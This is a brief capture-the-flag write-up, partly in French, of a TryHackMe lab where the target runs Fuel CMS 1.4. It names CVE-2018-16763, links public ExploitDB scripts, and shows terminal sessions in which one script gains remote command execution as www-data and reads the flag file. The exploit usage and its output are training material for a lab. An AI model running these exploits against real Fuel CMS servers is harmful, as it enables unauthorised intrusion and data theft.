# Write-up — Vunerabilty Capstone
**Date :** 2025-11-06
**Source :** THM
**Difficulté :** Easy

---

## Contexte
Hack the machine and answers the questions
IP : 10[.]10[.]22[.]131

1- What is the name of the application running on the vulnerable machine?

2- What is the version number of this application?

3- What is the number of the CVE that allows an attacker to remotely execute code on this application?

4- Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.

Note: There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)

5- What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.

## Notes à chaud (commandes & outputs)

1) 2) Fuel CMS v1.4 

3) CVE-2018-16763 (src : ExploitDB/Rapid7)

4) SQLi Blind : CVE-2020-17463
RCE : CVE-2018-16763 ExploitDB ID 50477 Fuel cms 1.4.1
RCE : CVE-2018-16763 ExploitDB ID 49487
RCE : CVE-2018-16763 ExploitDB ID 47138

5) 
DL ExploitDB ID 50477
https://www[.]exploit-db[.]com/download/50477

┌──(kali㉿kali)-[~/Downloads]
└─$ python 50477.py -u http://10[.]10[.]22[.]131 
[+]Connecting...
Enter Command $ls
system

Enter Command $whoami
system

Enter Command $uname -r
system

Enter Command $

==> KO

DL ExploitDB ID 47138
https://www[.]exploit-db[.]com/download/47138

Edit script URL : url = "http://10[.]10[.]22[.]131"

Launch Burpsuite Proxy

(Python3 byDefaut, I don't remove "raw_input" fonction. For python3, use "input()" fonc)
                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ python2 47138.py
cmd:id

[...]
                       Function: require_once                  </p>




</div>uid=33(www-data) gid=33(www-data) groups=33(www-data)

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

[...]

cmd: cat /home/ubuntu/flag.txt

[...]
</div>THM{ACKME_BLOG_HACKED}

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered
[...]

